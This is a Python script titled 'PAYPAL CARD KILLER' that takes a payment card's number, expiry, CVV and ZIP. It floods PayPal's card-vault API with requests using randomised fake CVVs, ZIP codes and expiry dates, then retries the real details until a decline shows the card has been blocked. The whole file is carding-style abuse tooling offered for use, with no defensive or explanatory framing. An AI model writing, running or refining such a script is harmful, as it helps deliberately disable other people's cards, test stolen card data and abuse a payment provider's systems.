import requests
import time
import random
import threading
import base64

# ========== USER INPUT ==========
print("="*50)
print("💳 PAYPAL CARD KILLER (LIVE API FLOW)")
print("="*50)

card_number = input("Enter Card Number: ")
exp_month   = input("Enter Expiry Month (MM): ")
exp_year    = input("Enter Expiry Year (YY): ")
cvv_real    = input("Enter CVV: ")
zip_real    = input("Enter ZIP Code: ")

# ========== PAYPAL API SETUP ==========
client_id = "YOUR_PAYPAL_CLIENT_ID"
secret    = "YOUR_PAYPAL_SECRET"
paypal_token_url = "https://api-m.sandbox.paypal.com/v1/oauth2/token"
paypal_charge_url = "https://api-m.sandbox.paypal.com/v2/payments/payment-method-tokens"

loading = True
start_time = time.time()

def get_paypal_token():
    try:
        auth = base64.b64encode(f"{client_id}:{secret}".encode()).decode()
        headers = {
            "Authorization": f"Basic {auth}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = {
            "grant_type": "client_credentials"
        }
        response = requests.post(paypal_token_url, headers=headers, data=data)
        return response.json().get("access_token", "")
    except Exception:
        return ""

def animate_loading():
    bar = ["[⏳     ]", "[⏳⏳    ]", "[⏳⏳⏳   ]", "[⏳⏳⏳⏳  ]", "[⏳⏳⏳⏳⏳ ]", "[⏳⏳⏳⏳⏳⏳]"]
    while loading:
        for stage in bar:
            print(f"\rProcessing {stage}", end="", flush=True)
            time.sleep(0.3)

def paypal_charge(cvv, zip_code, month, year, token):
    try:
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }
        data = {
            "number": card_number,
            "type": "visa",
            "expire_month": int(month),
            "expire_year": int("20" + year),
            "cvv2": cvv,
            "first_name": "Test",
            "last_name": "User",
            "billing_address": {
                "line1": "123 Main St",
                "city": "San Jose",
                "state": "CA",
                "postal_code": zip_code,
                "country_code": "US"
            }
        }
        response = requests.post("https://api-m.sandbox.paypal.com/v1/vault/credit-cards", json=data, headers=headers)
        if "id" in response.json():
            return "approved"
        elif "error" in response.json():
            return "declined"
        else:
            return "error"
    except Exception:
        return "timeout"

def kill_card():
    global loading
    attempt = 0
    killed = False
    token = get_paypal_token()

    if not token:
        loading = False
        print("\n[✖] Failed to get PayPal token")
        return

    while not killed:
        # === FAKE ATTEMPTS ===
        for _ in range(4):  # Adjust for PayPal if needed
            fake_cvv = str(random.randint(100, 999))
            fake_zip = str(random.randint(10000, 99999))
            fake_month = str(random.randint(1, 12)).zfill(2)
            fake_year = str(random.randint(25, 30))

            attempt += 1
            result = paypal_charge(fake_cvv, fake_zip, fake_month, fake_year, token)
            print(f"\n[Attempt {attempt}] Fake charge: {result}")

        # === REAL ATTEMPT ===
        result = paypal_charge(cvv_real, zip_real, exp_month, exp_year, token)

        if result == "declined":
            killed = True
        else:
            print("\n[✓] Card still alive... Retrying!\n")

    loading = False
    duration = round(time.time() - start_time, 2)
    print(f"\n💀 CARD SUCCESSFULLY KILLED! [Time: {duration}s]")

# ========== RUN THREADS ==========
t1 = threading.Thread(target=animate_loading)
t2 = threading.Thread(target=kill_card)

t1.start()
t2.start()
t2.join()
